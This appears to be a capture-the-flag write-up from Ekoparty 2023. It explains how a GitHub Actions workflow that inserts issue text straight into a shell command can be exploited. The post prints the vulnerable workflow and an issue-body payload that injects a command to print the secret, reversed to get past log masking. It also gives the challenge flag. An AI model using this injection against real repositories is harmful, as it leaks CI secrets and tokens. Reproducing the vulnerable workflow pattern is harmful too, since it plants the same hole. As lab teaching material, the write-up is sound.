---
title: Comments
type: writeup
date: 2023-11-12T19:56:46+02:00 
description: Writeup for Comments [Ekoparty 2023]
author: Honesty
tags:
- misc
draft: false
---
___

## Challenge Description

You must solve the first challenge to get the answer, all you need is inside the Lobby.

We have access to a GitHub repository with a single README file and a GitHub action workflow.

## Intuition

Checking the workflow script inside `.github/workflows/yearly_review.yml`

```yml
name: Parse review of teacher

on:
  issues:
    types: [opened, edited]

jobs:
  parse-review:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Teacher name and review from issue body
        id: extract-review
        env: 
          db_pass: ${{ secrets.FLAG }} # Do we still need this to write to the DB?
        run: |
          TEACHER=$(echo '${{ github.event.issue.body }}' | grep -oP 'Teacher:.*$')
          REVIEW=$(echo '${{ github.event.issue.body }}' | grep -vP 'Teacher:.*$')
          echo "::set-output name=teacher::$TEACHER"
          echo "::set-output name=review::$REVIEW"
      - name: Comment on issue
        uses: actions/github-script@v5
        with:
          github-token: ${{secrets.GITHUB_TOKEN}}
          script: |
            const issueComment = {
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: ${{ github.event.issue.number }},
              body: `Thank you for reviewing ${'{{ steps.extract-review.outputs.teacher }}'}! Your review was: 
              ${'{{ steps.extract-review.outputs.review }}'}`
            };
            github.rest.issues.createComment(issueComment);
```

Note the **comment** on the `db_pass` line, where our flag is stored.

## Solution

The GitHub action above is executed for every issue created. Before running anything the environment variable `db_pass` is set to `secrets.FLAG`.

The first command in the `run` section uses a [special construct](https://docs.github.com/en/actions/learn-github-actions/variables#using-the-env-context-to-access-environment-variable-values) that gives access to context properties `${{ CONTEXT.PROPERTY }}`. This construct is interpolated and replaced by a **string** before the line is sent to the bash runner, allowing us to manipulate the commands.

```sh
TEACHER=$(echo '${{ github.event.issue.body }}' | grep -oP 'Teacher:.*$')
```

To exploit this, we create a special issue body that modifies the command chain and prints the variable:

```sh
Teacher: ') ; echo ${db_pass}; $(echo '
```

Executing this example won't reveal the actual value of `db_pass` because the GitHub Action console censors the output, displaying `***`. We can overcome this limitation by simply reversing the value.
```sh
Teacher: ') ; echo ${db_pass} | rev; $(echo '
```

This is how the final command looks like:

```sh
TEACHER=$(echo 'Teacher: ') ; echo ${db_pass} | rev; $(echo '' | grep -oP 'Teacher:.*$')
```

Reversing this value again gives us the flag.

### Flag

EKO{m0ve_y0uR_b0dy}
